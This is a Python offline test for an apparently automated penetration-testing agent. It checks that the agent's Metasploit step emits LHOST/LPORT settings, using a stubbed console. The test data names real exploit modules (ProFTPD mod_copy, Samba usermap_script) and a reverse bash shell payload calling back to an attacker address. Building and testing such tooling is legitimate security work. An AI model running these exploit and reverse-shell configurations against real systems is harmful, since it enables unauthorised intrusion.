"""
Offline test for Stage D — LHOST/LPORT silent default fix.

Before the fix, _execute_msf_module only emitted `set LHOST` / `set LPORT`
when a payload was explicitly set on the node. With the tiny-intent
schema from Stage 4, payload is empty most of the time -- so LHOST/LPORT
never reached the MSF console and the default payload bound to 127.0.0.1.

Run: python experiments/test_stage_d_lhost.py
"""

from __future__ import annotations

import logging
import sys
import types
from io import StringIO
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

# ---- Prevent import-time MSF RPC connection ---------------------------------
_fake_msf = types.ModuleType("tools.metasploit_tools")

class _FakeMsfSession:
    def send_command(self, *a, **kw): return ""
    def run_session_command(self, *a, **kw): return ""

_fake_msf.msf_session = _FakeMsfSession()
_fake_msf.MetasploitSession = lambda *a, **kw: _FakeMsfSession()
_fake_msf.tool_session_command = lambda session_id, command: ""
sys.modules["tools.metasploit_tools"] = _fake_msf
# -----------------------------------------------------------------------------

from core_agents.attack_graph import AttackGraph, AttackNode
import core_agents.orchestrator as orch


PASS = "\033[92m[PASS]\033[0m"
FAIL = "\033[91m[FAIL]\033[0m"
results = []


def check(label, cond, detail=""):
    icon = PASS if cond else FAIL
    print(f"  {icon} {label}" + (f" -- {detail}" if detail else ""))
    results.append((label, cond))


def make_logger():
    buf = StringIO()
    log = logging.getLogger(f"sd_{id(buf)}")
    log.handlers.clear()
    log.setLevel(logging.DEBUG)
    h = logging.StreamHandler(buf)
    h.setLevel(logging.DEBUG)
    log.addHandler(h)
    log.propagate = False
    return log, buf


class RecordingMsf:
    """Captures every command sent to send_command for inspection."""
    def __init__(self, response: str = ""):
        self.commands = []
        self.response = response
    def send_command(self, cmd, timeout=120):
        self.commands.append(cmd)
        return self.response


# -----------------------------------------------------------------------------
# Test 1 — payload empty, payload_options set: LHOST/LPORT must reach console
# -----------------------------------------------------------------------------

def test_lhost_set_when_payload_empty():
    print("\n[Test 1] payload empty + payload_options set -> set LHOST/LPORT emitted")
    g = AttackGraph.create(
        objective="x", target_ip="10.0.0.5", attacker_ip="10.0.0.1", name="t",
    )
    node = AttackNode(
        id="n", label="n", agent_type="exploit", tool_name="metasploit",
        module="exploit/unix/ftp/proftpd_modcopy_exec",
        module_options={"RHOSTS": "10.0.0.5", "RPORT": 21},
        payload="",  # Stage 4's tiny-intent leaves payload empty
        payload_options={"LHOST": "10.0.0.1", "LPORT": 4444},
        target_ip="10.0.0.5",
    )
    g.add_node(node)
    log, _ = make_logger()
    msf = RecordingMsf(response="[*] Exploit completed.")

    orch._execute_msf_module(node, g, log, msf)

    check("'set LHOST 10.0.0.1' was emitted",
          "set LHOST 10.0.0.1" in msf.commands,
          detail=f"commands={msf.commands}")
    check("'set LPORT 4444' was emitted",
          "set LPORT 4444" in msf.commands)
    check("'set RHOSTS 10.0.0.5' was also emitted (module_options)",
          "set RHOSTS 10.0.0.5" in msf.commands)
    check("'use <module>' first",
          msf.commands[0] == "exploit/unix/ftp/proftpd_modcopy_exec" or
          msf.commands[0] == "use exploit/unix/ftp/proftpd_modcopy_exec")


# -----------------------------------------------------------------------------
# Test 2 — payload explicitly set: still emits PAYLOAD and LHOST/LPORT
# -----------------------------------------------------------------------------

def test_payload_explicit_still_works():
    print("\n[Test 2] payload set -> PAYLOAD line + LHOST/LPORT all emitted")
    g = AttackGraph.create(
        objective="x", target_ip="10.0.0.5", attacker_ip="10.0.0.1", name="t",
    )
    node = AttackNode(
        id="n", label="n", agent_type="exploit", tool_name="metasploit",
        module="exploit/multi/samba/usermap_script",
        module_options={"RHOSTS": "10.0.0.5", "RPORT": 445},
        payload="cmd/unix/reverse_bash",
        payload_options={"LHOST": "10.0.0.1", "LPORT": 5555},
        target_ip="10.0.0.5",
    )
    g.add_node(node)
    log, _ = make_logger()
    msf = RecordingMsf(response="[*] Done.")

    orch._execute_msf_module(node, g, log, msf)

    check("'set PAYLOAD cmd/unix/reverse_bash' emitted",
          "set PAYLOAD cmd/unix/reverse_bash" in msf.commands)
    check("'set LHOST 10.0.0.1' emitted",
          "set LHOST 10.0.0.1" in msf.commands)
    check("'set LPORT 5555' emitted",
          "set LPORT 5555" in msf.commands)
    # LHOST/LPORT must come AFTER set PAYLOAD so they bind to the right payload
    if "set PAYLOAD cmd/unix/reverse_bash" in msf.commands and "set LHOST 10.0.0.1" in msf.commands:
        idx_payload = msf.commands.index("set PAYLOAD cmd/unix/reverse_bash")
        idx_lhost = msf.commands.index("set LHOST 10.0.0.1")
        check("LHOST set AFTER PAYLOAD",
              idx_lhost > idx_payload,
              detail=f"PAYLOAD@{idx_payload}, LHOST@{idx_lhost}")


# -----------------------------------------------------------------------------
# Test 3 — no payload_options at all: no extra set lines, no crash
# -----------------------------------------------------------------------------

def test_no_payload_options_no_crash():
    print("\n[Test 3] empty payload_options -> no set LHOST emitted, no error")
    g = AttackGraph.create(
        objective="x", target_ip="10.0.0.5", attacker_ip="10.0.0.1", name="t",
    )
    node = AttackNode(
        id="n", label="n", agent_type="exploit", tool_name="metasploit",
        module="exploit/some/local",
        module_options={"RHOSTS": "10.0.0.5"},
        payload="",
        payload_options={},  # empty
        target_ip="10.0.0.5",
    )
    g.add_node(node)
    log, _ = make_logger()
    msf = RecordingMsf(response="[*] Done.")

    orch._execute_msf_module(node, g, log, msf)

    set_lhost_lines = [c for c in msf.commands if c.startswith("set LHOST")]
    check("no 'set LHOST' emitted (nothing to set)",
          len(set_lhost_lines) == 0)
    check("'run' still emitted",
          "run" in msf.commands)


# -----------------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------------

if __name__ == "__main__":
    print("=" * 70)
    print("Stage D offline check -- LHOST/LPORT silent default fix")
    print("=" * 70)

    test_lhost_set_when_payload_empty()
    test_payload_explicit_still_works()
    test_no_payload_options_no_crash()

    passed = sum(1 for _, ok in results if ok)
    total = len(results)
    print()
    print("=" * 70)
    if passed == total:
        print(f"  ALL {total} CHECKS PASSED")
        sys.exit(0)
    else:
        print(f"  {passed}/{total} checks passed -- {total - passed} FAILED")
        sys.exit(1)
